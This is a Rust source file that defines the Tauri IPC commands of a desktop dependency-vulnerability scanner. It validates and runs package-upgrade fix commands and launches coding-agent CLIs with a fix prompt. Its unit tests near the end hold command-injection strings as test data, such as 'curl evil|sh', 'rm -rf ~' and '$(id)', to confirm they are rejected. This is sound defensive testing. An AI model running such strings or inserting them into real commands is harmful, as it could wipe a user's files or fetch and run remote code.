// IPC surface used by src/lib/api.ts.

use crate::engine::{changed, now, Cmd, Shared};
use crate::model::*;
use crate::scan::fix::fix_command;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::time::Duration;
use tauri::{AppHandle, State};
use tauri_plugin_autostart::ManagerExt;
use tauri_plugin_opener::OpenerExt;

fn err(e: impl ToString) -> String {
    e.to_string()
}

#[tauri::command]
pub async fn get_state(sh: State<'_, Shared>) -> Result<AppState, String> {
    let live = sh.live.lock().unwrap_or_else(|e| e.into_inner()).clone();
    let mut state = sh.store.state(live.scanning, live.progress, now()).map_err(err)?;
    state.overview.phase = live.phase;
    Ok(state)
}

#[tauri::command]
pub async fn scan_now(sh: State<'_, Shared>) -> Result<(), String> {
    sh.tx.send(Cmd::ScanNow).map_err(err)
}

#[tauri::command]
pub async fn set_muted(app: AppHandle, sh: State<'_, Shared>, finding_id: i64, muted: bool) -> Result<(), String> {
    sh.store.set_muted(finding_id, muted).map_err(err)?;
    changed(&app);
    Ok(())
}

#[tauri::command]
pub async fn get_settings(sh: State<'_, Shared>) -> Result<Settings, String> {
    Ok(sh.store.settings())
}

#[tauri::command]
pub async fn set_settings(app: AppHandle, sh: State<'_, Shared>, settings: Settings) -> Result<(), String> {
    sh.store.set_settings(&settings).map_err(err)?;
    let launcher = app.autolaunch();
    let enabled = launcher.is_enabled().unwrap_or(false);
    if settings.launch_at_login != enabled {
        let _ = if settings.launch_at_login { launcher.enable() } else { launcher.disable() };
    }
    sh.tx.send(Cmd::SettingsChanged).map_err(err)?;
    changed(&app);
    Ok(())
}

#[tauri::command]
pub async fn open_url(app: AppHandle, url: String) -> Result<(), String> {
    if !(url.starts_with("https://") || url.starts_with("http://")) {
        return Err("only http(s) links can be opened".into());
    }
    app.opener().open_url(url, None::<&str>).map_err(err)
}

#[tauri::command]
pub async fn reveal_path(app: AppHandle, path: String) -> Result<(), String> {
    app.opener().reveal_item_in_dir(path).map_err(err)
}

#[derive(Serialize)]
pub struct AgentInfo {
    /// This app's own executable, which is also the `novul` CLI.
    pub bin: String,
    /// Coding agent CLIs found on the login shell's PATH: "claude", "codex".
    pub agents: Vec<String>,
}

const AGENTS: [&str; 2] = ["claude", "codex"];

#[tauri::command]
pub async fn agent_info() -> Result<AgentInfo, String> {
    let bin = std::env::current_exe().map_err(err)?.to_string_lossy().into_owned();
    // GUI apps get a minimal PATH; a login shell sees ~/.local/bin, Homebrew, npm globals.
    let probe = tokio::process::Command::new("/bin/zsh")
        .args(["-lc", "for a in claude codex; do command -v $a >/dev/null && echo $a; done"])
        .output();
    let found = match tokio::time::timeout(Duration::from_secs(5), probe).await {
        Ok(Ok(out)) => String::from_utf8_lossy(&out.stdout).lines().map(String::from).filter(|a| AGENTS.contains(&a.as_str())).collect(),
        _ => vec![],
    };
    Ok(AgentInfo { bin, agents: found })
}

fn sh_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// A Terminal script that starts `agent` in `cwd` with the prompt read from `prompt`, then deletes
/// both files. The prompt never passes through the shell as code.
fn agent_script(agent: &str, prompt: &Path, cwd: &Path) -> String {
    format!(
        "#!/bin/zsh -l\ncd {} 2>/dev/null || cd ~\np=\"$(cat {})\"\nrm -f {} \"$0\"\nexec {agent} \"$p\"\n",
        sh_quote(&cwd.to_string_lossy()),
        sh_quote(&prompt.to_string_lossy()),
        sh_quote(&prompt.to_string_lossy()),
    )
}

/// Opens Terminal with Claude Code or Codex already given the fix prompt.
#[tauri::command]
pub async fn open_in_agent(app: AppHandle, agent: String, prompt: String, cwd: Option<String>) -> Result<(), String> {
    use std::os::unix::fs::PermissionsExt;
    use tauri::Manager;
    if !AGENTS.contains(&agent.as_str()) {
        return Err(format!("unknown agent: {agent}"));
    }
    let dir = app.path().app_cache_dir().map_err(err)?.join("agent");
    std::fs::create_dir_all(&dir).map_err(err)?;
    let id = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map_err(err)?.as_millis();
    let prompt_path = dir.join(format!("prompt-{id}.txt"));
    let script = dir.join(format!("fix-with-{agent}-{id}.command"));
    let cwd = cwd.map(PathBuf::from).filter(|p| p.is_dir()).or_else(dirs::home_dir).ok_or("no folder to start in")?;
    std::fs::write(&prompt_path, prompt).map_err(err)?;
    std::fs::set_permissions(&prompt_path, std::fs::Permissions::from_mode(0o600)).map_err(err)?;
    std::fs::write(&script, agent_script(&agent, &prompt_path, &cwd)).map_err(err)?;
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).map_err(err)?;
    let status = tokio::process::Command::new("/usr/bin/open").arg(&script).status().await.map_err(err)?;
    if status.success() {
        Ok(())
    } else {
        Err("couldn't open Terminal".into())
    }
}

#[tauri::command]
pub async fn take_focus_request(sh: State<'_, Shared>) -> Result<Option<i64>, String> {
    Ok(sh.focus.lock().unwrap_or_else(|e| e.into_inner()).take())
}

/// Save a PNG snapshot (data URL from the UI) to the Desktop and reveal it in Finder.
#[tauri::command]
pub async fn save_image(app: AppHandle, data_url: String) -> Result<String, String> {
    use base64::Engine;
    let b64 = data_url.strip_prefix("data:image/png;base64,").ok_or("expected a PNG data URL")?;
    let bytes = base64::engine::general_purpose::STANDARD.decode(b64).map_err(err)?;
    let dir = dirs::desktop_dir().or_else(dirs::home_dir).ok_or("no Desktop folder")?;
    let path = dir.join(format!("NoVul snapshot {}.png", now()));
    std::fs::write(&path, bytes).map_err(err)?;
    let _ = app.opener().reveal_item_in_dir(&path);
    Ok(path.to_string_lossy().into_owned())
}

#[derive(Debug, Serialize)]
pub struct ApplyResult {
    pub ok: bool,
    pub output: String,
}

/// A fix command that passed validation, with where to run it.
#[derive(Debug, PartialEq)]
pub struct FixPlan {
    pub command: String,
    pub dir: PathBuf,
    /// Lockfile to rescan after a successful run.
    pub rescan: Option<PathBuf>,
}

fn safe_name(s: &str) -> bool {
    !s.is_empty() && !s.starts_with('-') && s.bytes().all(|b| b.is_ascii_alphanumeric() || b"@._/+-".contains(&b))
}

fn safe_version(s: &str) -> bool {
    !s.is_empty() && !s.starts_with('-') && s.bytes().all(|b| b.is_ascii_alphanumeric() || b".+_-".contains(&b))
}

/// Lockfile contents and package names are attacker-controlled, so the stored command is never
/// trusted: it must equal what we regenerate from the stored fields, and every field must be tame.
pub fn validate_fix(f: &FindingView) -> Result<FixPlan, String> {
    let stored = f.fix_command.as_deref().filter(|c| !c.is_empty()).ok_or("this finding has no fix command")?;
    let home = || dirs::home_dir().ok_or_else(|| "no home directory".to_string());
    match f.kind.as_str() {
        "package" => {
            if !stored.starts_with("cd ") {
                return Err("the fix is an instruction to follow by hand, not a command".into());
            }
            let fixed = f.fixed_version.as_deref().unwrap_or("");
            if !safe_name(&f.name) {
                return Err(format!("package name {:?} has unexpected characters", f.name));
            }
            if !safe_version(fixed) {
                return Err(format!("fixed version {fixed:?} has unexpected characters"));
            }
            let lockfile = Path::new(&f.project_path);
            let dir = lockfile.parent().filter(|d| d.is_dir()).ok_or("project directory no longer exists")?;
            let expected = fix_command(lockfile, &f.ecosystem, &f.name, fixed, f.direct);
            if expected.as_deref() != Some(stored) {
                return Err("stored fix command does not match the one regenerated from the finding".into());
            }
            Ok(FixPlan { command: stored.into(), dir: dir.into(), rescan: Some(lockfile.into()) })
        }
        "brew" | "runtime" => {
            let formula = stored.strip_prefix("brew upgrade ").ok_or("only `brew upgrade <formula>` can be applied")?;
            if !safe_name(formula) {
                return Err(format!("formula name {formula:?} has unexpected characters"));
            }
            if f.kind == "brew" && formula != f.name {
                return Err("stored fix command does not match the finding's formula".into());
            }
            Ok(FixPlan { command: stored.into(), dir: home()?, rescan: None })
        }
        "global" => {
            let (n, v) = (&f.name, f.fixed_version.as_deref().unwrap_or(""));
            if !safe_name(n) {
                return Err(format!("package name {n:?} has unexpected characters"));
            }
            let allowed = [
                format!("npm install -g {n}@{v}"),
                format!("pnpm add -g {n}@{v}"),
                format!("pipx upgrade {n}"),
                format!("uv tool upgrade {n}"),
            ];
            if (!v.is_empty() && !safe_version(v)) || !allowed.iter().any(|a| a == stored) {
                return Err("stored fix command is not a recognised global-package upgrade".into());
            }
            Ok(FixPlan { command: stored.into(), dir: home()?, rescan: None })
        }
        k => Err(format!("fixes cannot be applied to {k} findings")),
    }
}

const OUTPUT_TAIL: usize = 20 * 1024;

fn tail(mut s: String) -> String {
    if s.len() > OUTPUT_TAIL {
        let mut cut = s.len() - OUTPUT_TAIL;
        while !s.is_char_boundary(cut) {
            cut += 1;
        }
        s = format!("[...truncated]\n{}", &s[cut..]);
    }
    s
}

/// Run `command` in a login zsh (for the user's PATH) with no stdin and stderr merged into stdout.
pub async fn run_shell(command: &str, dir: &Path, timeout: Duration) -> Result<ApplyResult, String> {
    let child = tokio::process::Command::new("/bin/zsh")
        .args(["-lc", &format!("exec 2>&1; {command}")])
        .current_dir(dir)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(err)?;
    match tokio::time::timeout(timeout, child.wait_with_output()).await {
        Ok(out) => {
            let out = out.map_err(err)?;
            Ok(ApplyResult { ok: out.status.success(), output: tail(String::from_utf8_lossy(&out.stdout).into_owned()) })
        }
        Err(_) => Err(format!("timed out after {} s; the command was stopped", timeout.as_secs())),
    }
}

/// Runs the finding's validated fix command. The UI must show the exact command and get a
/// confirmation before calling this.
#[tauri::command]
pub async fn apply_fix(sh: State<'_, Shared>, finding_id: i64) -> Result<ApplyResult, String> {
    let f = sh.store.finding(finding_id).map_err(err)?.ok_or("finding not found")?;
    let plan = validate_fix(&f)?;
    let res = run_shell(&plan.command, &plan.dir, Duration::from_secs(300)).await?;
    if res.ok {
        if let Some(lockfile) = plan.rescan {
            let _ = sh.tx.send(Cmd::RescanLockfiles(vec![lockfile]));
        }
    }
    Ok(res)
}

#[derive(Debug, Serialize)]
pub struct RootSuggestion {
    pub path: String,
    /// None when counting took longer than the budget (a big folder, so likely the right one).
    pub projects: Option<usize>,
}

const ROOT_CANDIDATES: [&str; 18] = [
    "Workspace", "workspace", "Developer", "Projects", "projects", "code", "Code", "src", "dev", "Dev", "GitHub",
    "github", "git", "repos", "Repos", "Documents/GitHub", "Documents/Projects", "Sites",
];
const COUNT_BUDGET: Duration = Duration::from_millis(1500);

/// Candidate folders under `home` that exist, once each (APFS is case-insensitive, so
/// ~/workspace and ~/Workspace are one folder).
fn existing_candidates(home: &Path) -> Vec<PathBuf> {
    let mut seen = std::collections::HashSet::new();
    ROOT_CANDIDATES
        .iter()
        .map(|c| home.join(c))
        .filter(|p| p.is_dir())
        .filter(|p| seen.insert(p.canonicalize().unwrap_or_else(|_| p.clone())))
        .collect()
}

/// Most projects first (uncounted big folders on top); folders without projects only when
/// nothing has any.
fn rank(mut found: Vec<RootSuggestion>) -> Vec<RootSuggestion> {
    found.sort_by_key(|s| std::cmp::Reverse(s.projects.unwrap_or(usize::MAX)));
    if found.iter().any(|s| s.projects != Some(0)) {
        found.retain(|s| s.projects != Some(0));
    }
    found
}

fn count_projects(root: PathBuf) -> usize {
    let found = crate::inventory::discover::discover(&[root], &Settings::default().exclusions);
    found.iter().map(|l| &l.root).collect::<std::collections::HashSet<_>>().len()
}

/// Folders where the user probably keeps code, for the first-run question. A folder whose walk
/// takes longer than the budget is listed without a count.
#[tauri::command]
pub async fn suggest_roots() -> Result<Vec<RootSuggestion>, String> {
    let home = dirs::home_dir().ok_or("no home directory")?;
    let jobs: Vec<_> = existing_candidates(&home)
        .into_iter()
        .map(|p| (p.clone(), tokio::task::spawn_blocking(move || count_projects(p))))
        .collect();
    let mut found = Vec::new();
    for (path, job) in jobs {
        let projects = match tokio::time::timeout(COUNT_BUDGET, job).await {
            Ok(Ok(n)) => Some(n),
            Ok(Err(_)) => continue,
            Err(_) => None,
        };
        found.push(RootSuggestion { path: path.to_string_lossy().into_owned(), projects });
    }
    Ok(rank(found))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn finding(dir: &Path, kind: &str, lock: &str, name: &str, fixed: &str, direct: Option<bool>, cmd: Option<String>) -> FindingView {
        FindingView {
            id: 1,
            kind: kind.into(),
            group_id: "CVE-1".into(),
            aliases: vec![],
            summary: String::new(),
            priority: Priority::High,
            score: None,
            kev: false,
            ecosystem: "npm".into(),
            name: name.into(),
            installed_version: "1.0.0".into(),
            fixed_version: Some(fixed.into()),
            direct,
            dev: false,
            inferred: false,
            project_path: dir.join(lock).to_string_lossy().into_owned(),
            project_name: "p".into(),
            fix_command: cmd,
            url: String::new(),
            first_seen_at: 0,
            muted: false,
            epss: None,
        }
    }

    /// A package finding whose stored command is what the scanner would have generated.
    fn pkg(dir: &Path, lock: &str, name: &str, fixed: &str, direct: Option<bool>) -> FindingView {
        let cmd = fix_command(&dir.join(lock), "x", name, fixed, direct);
        finding(dir, "package", lock, name, fixed, direct, cmd)
    }

    fn brew(name: &str, cmd: &str, kind: &str) -> FindingView {
        finding(Path::new("/nonexistent"), kind, "homebrew", name, "1.2.3", None, Some(cmd.into()))
    }

    #[test]
    fn accepts_generated_commands_for_each_manager() {
        let d = tempfile::tempdir().unwrap();
        let cases = [
            ("package-lock.json", "@scope/lodash", Some(true)),
            ("package-lock.json", "minimist", Some(false)),
            ("pnpm-lock.yaml", "left-pad", Some(true)),
            ("yarn.lock", "left-pad", Some(true)),
            ("uv.lock", "requests", Some(true)),
            ("poetry.lock", "requests", Some(false)),
            ("requirements.txt", "Django", None),
            ("composer.lock", "vendor/pkg", Some(true)),
            ("go.mod", "golang.org/x/net", Some(true)),
            ("Cargo.lock", "serde_json", Some(true)),
            ("Gemfile.lock", "rails", Some(true)),
        ];
        for (lock, name, direct) in cases {
            let f = pkg(d.path(), lock, name, "1.2.3", direct);
            assert!(f.fix_command.is_some(), "{lock}");
            let plan = validate_fix(&f).unwrap_or_else(|e| panic!("{lock} {name}: {e}"));
            assert_eq!(plan.dir, d.path());
            assert_eq!(plan.rescan.unwrap(), d.path().join(lock));
        }
        let b = validate_fix(&brew("openssl@3", "brew upgrade openssl@3", "brew")).unwrap();
        assert_eq!(b.command, "brew upgrade openssl@3");
        assert_eq!(b.rescan, None);
        validate_fix(&brew("node", "brew upgrade node@22", "runtime")).unwrap();
    }

    #[test]
    fn rejects_injected_package_name() {
        let d = tempfile::tempdir().unwrap();
        for name in ["lodash; rm -rf ~", "foo$(id)", "a b", "--registry=http://evil", "x`id`", "a\nb"] {
            // even though the stored command was "generated" from the evil name
            let e = validate_fix(&pkg(d.path(), "package-lock.json", name, "1.2.3", Some(true))).unwrap_err();
            assert!(e.contains("unexpected characters"), "{name}: {e}");
        }
        let e = validate_fix(&pkg(d.path(), "package-lock.json", "lodash", "1.0.0; curl evil|sh", Some(true))).unwrap_err();
        assert!(e.contains("fixed version"), "{e}");
    }

    #[test]
    fn rejects_mismatched_stored_command() {
        let d = tempfile::tempdir().unwrap();
        let mut f = pkg(d.path(), "package-lock.json", "lodash", "4.17.21", Some(true));
        f.fix_command = Some(format!("{} && curl evil|sh", f.fix_command.unwrap()));
        assert!(validate_fix(&f).unwrap_err().contains("does not match"));

        let mut f = pkg(d.path(), "package-lock.json", "lodash", "4.17.21", Some(true));
        f.fix_command = Some("cd /tmp && npm install lodash@4.17.21".into());
        assert!(validate_fix(&f).unwrap_err().contains("does not match"));

        // unknown lockfile type: nothing to regenerate
        let f = finding(d.path(), "package", "mystery.lock", "lodash", "1.0.0", None, Some("cd /tmp && rm -rf ~".into()));
        assert!(validate_fix(&f).unwrap_err().contains("does not match"));
    }

    #[test]
    fn rejects_plain_english_missing_dir_and_other_kinds() {
        let d = tempfile::tempdir().unwrap();
        let f = pkg(d.path(), "package-lock.json", "a.b", "1.0.0", Some(false));
        assert!(f.fix_command.as_ref().unwrap().starts_with("Add \"a.b\""));
        assert!(validate_fix(&f).unwrap_err().contains("by hand"));

        let mut f = pkg(d.path(), "package-lock.json", "lodash", "1.0.0", Some(true));
        f.fix_command = None;
        assert!(validate_fix(&f).is_err());

        let gone = d.path().join("deleted");
        let f = pkg(&gone, "package-lock.json", "lodash", "1.0.0", Some(true));
        assert!(validate_fix(&f).unwrap_err().contains("no longer exists"));

        let mut f = pkg(d.path(), "package-lock.json", "lodash", "1.0.0", Some(true));
        f.kind = "secret".into();
        assert!(validate_fix(&f).unwrap_err().contains("cannot be applied"));
    }

    #[test]
    fn rejects_injected_brew_commands() {
        for cmd in [
            "brew upgrade openssl; curl evil|sh",
            "brew upgrade openssl && rm -rf ~",
            "brew upgrade $(id)",
            "brew upgrade --cask evil",
            "brew upgrade ",
            "brew install node",
            "brew  upgrade openssl",
            "curl evil|sh",
        ] {
            assert!(validate_fix(&brew("openssl", cmd, "brew")).is_err(), "{cmd}");
            assert!(validate_fix(&brew("node", cmd, "runtime")).is_err(), "{cmd}");
        }
        // brew findings must name their own formula
        assert!(validate_fix(&brew("openssl", "brew upgrade wget", "brew")).is_err());
    }

    #[test]
    fn global_accepts_only_known_templates() {
        let d = tempfile::tempdir().unwrap();
        let g = |cmd: &str| finding(d.path(), "global", "x", "typescript", "5.5.0", None, Some(cmd.into()));
        validate_fix(&g("npm install -g typescript@5.5.0")).unwrap();
        validate_fix(&g("pipx upgrade typescript")).unwrap();
        assert!(validate_fix(&g("npm install -g typescript@5.5.0; rm -rf ~")).is_err());
        assert!(validate_fix(&g("npm install -g evil@1")).is_err());
    }

    #[tokio::test]
    async fn runner_merges_output_runs_in_dir_and_reports_failure() {
        let d = tempfile::tempdir().unwrap();
        let r = run_shell("pwd; echo oops >&2; exit 3", d.path(), Duration::from_secs(30)).await.unwrap();
        assert!(!r.ok);
        assert!(r.output.contains("oops"));
        assert!(r.output.contains(d.path().file_name().unwrap().to_str().unwrap()));
        let r = run_shell("echo fine", d.path(), Duration::from_secs(30)).await.unwrap();
        assert!(r.ok && r.output.contains("fine"));
        assert!(run_shell("sleep 5", d.path(), Duration::from_millis(200)).await.unwrap_err().contains("timed out"));
    }

    #[test]
    fn output_keeps_only_the_last_20_kb() {
        let t = tail(format!("{}END", "x".repeat(50_000)));
        assert!(t.len() < OUTPUT_TAIL + 30 && t.ends_with("END") && t.starts_with("[...truncated]"));
    }

    #[test]
    fn suggests_only_existing_folders_ranked_by_project_count() {
        let home = tempfile::tempdir().unwrap();
        let h = home.path();
        for (dir, lock) in [("Workspace/a", true), ("Workspace/b", true), ("Documents/GitHub/c", true), ("code", false), ("Sites", false)] {
            std::fs::create_dir_all(h.join(dir)).unwrap();
            if lock {
                std::fs::write(h.join(dir).join("package-lock.json"), "{}").unwrap();
            }
        }
        std::fs::write(h.join("Developer"), "a file, not a folder").unwrap();

        let names: Vec<_> = existing_candidates(h).iter().map(|p| p.strip_prefix(h).unwrap().to_string_lossy().into_owned()).collect();
        assert_eq!(names.iter().filter(|n| n.eq_ignore_ascii_case("workspace")).count(), 1);
        assert!(names.contains(&"code".to_string()) && names.contains(&"Documents/GitHub".to_string()));
        assert!(!names.contains(&"Developer".to_string()) && !names.contains(&"src".to_string()));

        let counted: Vec<_> = existing_candidates(h)
            .into_iter()
            .map(|p| RootSuggestion { path: p.to_string_lossy().into_owned(), projects: Some(count_projects(p)) })
            .collect();
        let ranked = rank(counted);
        let got: Vec<_> = ranked.iter().map(|s| (s.path.strip_prefix(h.to_str().unwrap()).unwrap().trim_start_matches('/').to_string(), s.projects)).collect();
        assert_eq!(got.len(), 2, "empty folders are hidden: {got:?}");
        assert!(got[0].0.eq_ignore_ascii_case("workspace") && got[0].1 == Some(2));
        assert_eq!(got[1], ("Documents/GitHub".to_string(), Some(1)));
    }

    #[test]
    fn agent_script_quotes_paths_and_never_evaluates_the_prompt() {
        let s = agent_script("claude", Path::new("/tmp/a b/prompt-1.txt"), Path::new("/Users/me/it's $(here)"));
        assert!(s.starts_with("#!/bin/zsh -l\n"));
        assert!(s.contains("cd '/Users/me/it'\\''s $(here)' 2>/dev/null || cd ~\n"), "{s}");
        assert!(s.contains("p=\"$(cat '/tmp/a b/prompt-1.txt')\"\n"));
        assert!(s.ends_with("exec claude \"$p\"\n"));
    }

    #[test]
    fn keeps_empty_folders_when_nothing_has_projects() {
        let all_empty = vec![RootSuggestion { path: "/a".into(), projects: Some(0) }, RootSuggestion { path: "/b".into(), projects: Some(0) }];
        assert_eq!(rank(all_empty).len(), 2);
        assert!(rank(vec![]).is_empty());

        let s = |p: &str, n| RootSuggestion { path: p.into(), projects: n };
        let ranked = rank(vec![s("/few", Some(3)), s("/empty", Some(0)), s("/huge", None)]);
        let paths: Vec<_> = ranked.iter().map(|r| r.path.as_str()).collect();
        assert_eq!(paths, ["/huge", "/few"], "a folder too big to count in time is still suggested, first");
    }
}
